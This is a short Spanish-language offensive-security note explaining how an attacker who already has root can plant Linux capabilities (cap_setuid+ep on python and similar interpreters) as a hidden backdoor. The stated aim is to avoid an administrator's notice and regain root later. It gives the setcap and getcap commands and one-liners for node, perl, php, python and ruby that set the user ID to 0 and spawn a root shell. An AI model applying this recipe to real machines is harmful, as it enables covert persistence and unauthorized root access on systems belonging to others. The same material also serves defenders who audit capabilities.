# PERSISTENCIA A TRAVES DE LAS CAPABILITIIES

Supongamos que a comprometimos una maquina y escalamos privilegios, queremos crear una forma de persistencia con esta maquina pero de forma privilegiada. Es decir salirnoss de la maquina, volvera entrar y poder volver a ser root. Como yya fue una maquina comprometida y ya escalamoslos privilegios pdemos hacerlo como lo hicimos si no es mucho lio. 

Tambien podemois debar un binario con un permiso SUID pero si el administrador revisa esto lo quitara y nos arruina el proceso. Es ahi donde entran las capabilities, son como permisos privilegiados en un programa pero que a nivel de permisos no se muestra nada diferente.

Con las capabilities una vez que volvamos a acceder ala maquina sera muy facil convertirnos en Root, no se ve nada raro en la maquina victima y seracomo dejar nuestra escalera para subir.

## AGREGAR, ELIMINAR Y OBTENER CAPABILITIES

```
OBTENCION (como usuario no privilegiado)

getcap -r / 2>/dev/null

-r: deforma recursiva
/: ruta en este caso la raiz

la capabilitie 'cap_setuid+ep' eslaque nos interesa de lo que muestra en el los resultados, ella debe estar asignada a un binario como php, python, bash, etc. 
```

```
ELIMINACION (como usuario privilegiado)

setcap -r /usr/bin/pthon3.8

-r: remove
```

```
AGREGAR (como usuario privilegiado)

setcap cap_setuid+ep /usr/bin/pthon3.8

```

## UNA VEZ IDENTIFICADO LA CAPABILITIE

Mediante la pagina GTFObins muestra diferentes ejemplos de los binarios que podemos explotar si tienen essta capabilitie del cap_setuid+ep. Por ejemplo:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```
si node tiene la capabilitie:

./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'

si perl tiene la capabilitie:

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

si php tiene la capabilitie:

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"

si python tiene la capabilitie:

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

si ruby tiene la capabilitie:

./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

```

Ejecutando el comando segun el binario debera abrirse una terminal como el usuario Root.